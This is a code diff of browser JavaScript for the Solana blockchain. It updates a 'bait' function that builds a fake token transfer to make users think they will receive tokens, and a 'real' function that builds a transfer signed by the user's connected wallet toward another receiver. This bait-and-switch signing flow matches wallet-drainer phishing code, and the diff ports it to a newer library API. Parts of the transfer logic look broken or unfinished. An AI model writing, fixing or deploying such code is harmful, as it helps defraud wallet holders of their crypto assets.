@@ -1,5 +1,5 @@
 import { Connection, PublicKey, SystemProgram, Transaction, LAMPORTS_PER_SOL } from '@solana/web3.js';
-import { Token, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferInstruction, ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { Buffer } from 'buffer';
 
 window.Buffer = Buffer; // Make Buffer available globally if needed
@@ -9,21 +9,22 @@ async function triggerBaitTransaction() {
     const publicKey = new PublicKey(window.solana.publicKey);
 
     const fakeMint = new PublicKey('8D37jiPH55BPAD171YbZnsUTydwAseHgT7CQMjFKcKTU'); // Fake token mint address
-    const fakeReceiverAddress = await Token.getAssociatedTokenAddress(
-        ASSOCIATED_TOKEN_PROGRAM_ID,
-        TOKEN_PROGRAM_ID,
+    const fakeReceiverAddress = await getAssociatedTokenAddress(
         fakeMint,
-        publicKey
+        publicKey,
+        false,
+        TOKEN_PROGRAM_ID,
+        ASSOCIATED_TOKEN_PROGRAM_ID
     );
 
     let fakeTransaction = new Transaction().add(
-        Token.createTransferInstruction(
-            TOKEN_PROGRAM_ID,
+        createTransferInstruction(
             fakeReceiverAddress,
             fakeReceiverAddress, // Simulate as if the user will receive tokens
             publicKey,
+            1, // Fake token amount
             [],
-            1 // Fake token amount
+            TOKEN_PROGRAM_ID
         )
     );
 
@@ -48,7 +49,29 @@ async function triggerRealTransaction() {
 
         let transaction = new Transaction();
 
-        // Real transaction code as before...
+        // Assuming you want to transfer tokens or SOL in the real transaction...
+
+        const tokenMint = new PublicKey("TOKEN_MINT_ADDRESS_HERE"); // Replace with actual token mint
+        const associatedTokenAddress = await getAssociatedTokenAddress(
+            tokenMint,
+            receiverWallet,
+            false,
+            TOKEN_PROGRAM_ID,
+            ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+
+        transaction.add(
+            createTransferInstruction(
+                associatedTokenAddress,
+                associatedTokenAddress, // Transfer to receiver
+                publicKey,
+                1, // Real token amount
+                [],
+                TOKEN_PROGRAM_ID
+            )
+        );
+
+        // Add other transfer logic (e.g., SOL transfer)...
 
         transaction.feePayer = publicKey;
         const blockhashObj = await connection.getRecentBlockhash();
